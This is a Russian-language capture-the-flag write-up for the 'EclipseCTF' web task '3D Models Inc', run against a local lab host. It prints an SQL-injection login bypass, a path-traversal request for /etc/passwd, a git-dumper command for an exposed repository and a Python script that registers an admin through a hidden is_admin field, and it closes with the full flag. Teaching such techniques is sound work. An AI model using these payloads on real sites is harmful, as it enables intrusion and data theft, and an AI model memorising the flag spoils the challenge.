# 3D Models Inc

***Описание***: Я, конееечно же, всё понимаю, но так бездарно вести разработку сайтов! Это надо уметь...

Ссылка: `http://localhost:43434`

Формат: EclipseCTF{...}

---
### Решение - Этап 1. Исследование ресурса

Переходим на сайт:

![ScreenShot](screenshots/3D-models-inc-1.png)

Видим две формы - регистрация и авторизация. Логинов и паролей мы потенциально не знаем, но можно подобрать **Test:Test**, либо зарегистрироваться, либо войти через SQLi:

```
Логин: ' OR 1=1 --
Пароль: ' OR 1=1 --
(Доступны различные вариации, достаточно и просто в логин вставить нагрузку)
```

Таким образом, мы попадаем на главную страницу:

![ScreenShot](screenshots/3D-models-inc-2.png)

### Решение - Этап 2. Ошибка в профиле и отображение страниц (Path Traversal)

Переходим во вкладку "**Profile**":

![ScreenShot](screenshots/3D-models-inc-3.png)

>**TestUserName** - первый пользователь в таблице с пользователями внутри сервиса, поэтому при эксплуатации SQLi, мы получаем доступ относительно этого пользователя

Замечаем, что присутствует ошибка, связанная с `session_start()`. При этом мы получаем сведения о расположении сайта внутри контейнера - `/var/www/html/content_blocks/profile_content.php`

Далее обращаем внимание на то, как подгружается страница `profile_content.php` в URL-адресе:

```
http://192.168.31.9:43434/home.php?view=profile_content.php
```

Параметр `?view=`. Интересно! А еще интереснее, что нашли `Path Traversal`. Убедимся в этом:

```
http://192.168.31.9:43434/home.php?view=../../../../etc/passwd
```

![ScreenShot](screenshots/3D-models-inc-4.png)

Отлично! Но чем нам это может помочь? Если у вас получится докрутить до RCE - удачи, вы найдете новый вектор. Но, на мой взгляд, можно пойти по другому пути.

### Решение - Этап 3. Нахождение git-репозитория

Исследуем директории через `wfuzz`:

![ScreenShot](screenshots/3D-models-inc-5.png)

При переходе на `database` обнаруживаем `Forbidden`. Но, удача! 200 на `.git/HEAD`:

![ScreenShot](screenshots/3D-models-inc-6.png)

Используем `git-dumper` для того, чтобы выгрузить репозиторий:

```sh
git-dumper http://192.168.31.9:43434/.git/ ~/web-3d-models
```

![ScreenShot](screenshots/3D-models-inc-7.png)

### Решение - Этап 4. Исследование git-репозитория

Переходим в папку с полученным репозиторием:

![ScreenShot](screenshots/3D-models-inc-8.png)

Видим директорию `flag`. Забираем 2-ю часть флага:

![ScreenShot](screenshots/3D-models-inc-9.png)

Далее нам надо найти 1-ю и 3-ю части флага. Заглянем в директорию с БД:

![ScreenShot](screenshots/3D-models-inc-10.png)

Теперь мы знаем полный путь и название файла. Можно забрать сам файл, а можно и скачать напрямую:

```
http://192.168.31.9:43434/database/service-db.db
```

Открываем БД в DBBrowser:

![ScreenShot](screenshots/3D-models-inc-11.png)

Вот и наша третья часть флага. Но где первая? Вопрос крайне интересный. Для этого нам необходимо немного исследовать исходники и понять один ключевой пробел в безопасности, а именно - скрытый параметр при создании пользователя:

![ScreenShot](screenshots/3D-models-inc-12.png)

Иными словами, если нет передачи параметра `is_admin`, то он по умолчанию будет `False`. Но при регистрации мы можем передать этот параметр! Сплойт для создания админа:

```python
import requests
import os
import re
from bs4 import BeautifulSoup


sess = requests.Session()


def create_user_data():
	return [f"hacker-{os.urandom(8).hex()}", os.urandom(8).hex()]


creds = create_user_data()


# URL: http://localhost:1337/register.php
def register_admin_account(url, session, username, password):
	register_data = {
		"name": username,
		"username": username,
		"password": password,
		"is_admin": True,
		"register": "" # Да-да, тут нюанс!
	}

	register_resp = session.post(url, register_data)

	if (register_resp.status_code == 200):
		return f"[+] ADMIN Account was registered: {username} | {password}"
	else:
		return 0 


if __name__ == "__main__":
	print(register_admin_account("http://192.168.31.9:43434/register.php", sess, creds[0], creds[1]))
```

Запускаем:

![ScreenShot](screenshots/3D-models-inc-13.png)

Проходим авторизацию с полученными данными:

![ScreenShot](screenshots/3D-models-inc-14.png)

И вот она - последняя часть флага!

P.S. Я уверен в том, что таск можно решить и несколько иными способами на тех или иных этапах. Тут уже кто и как подходит к решению задачи! Так называемое "эталонное решение" представлено здесь

---

***Флаг***: `EclipseCTF{n0t_3v3n_gh0st5_4r3_th1s_3mpty}`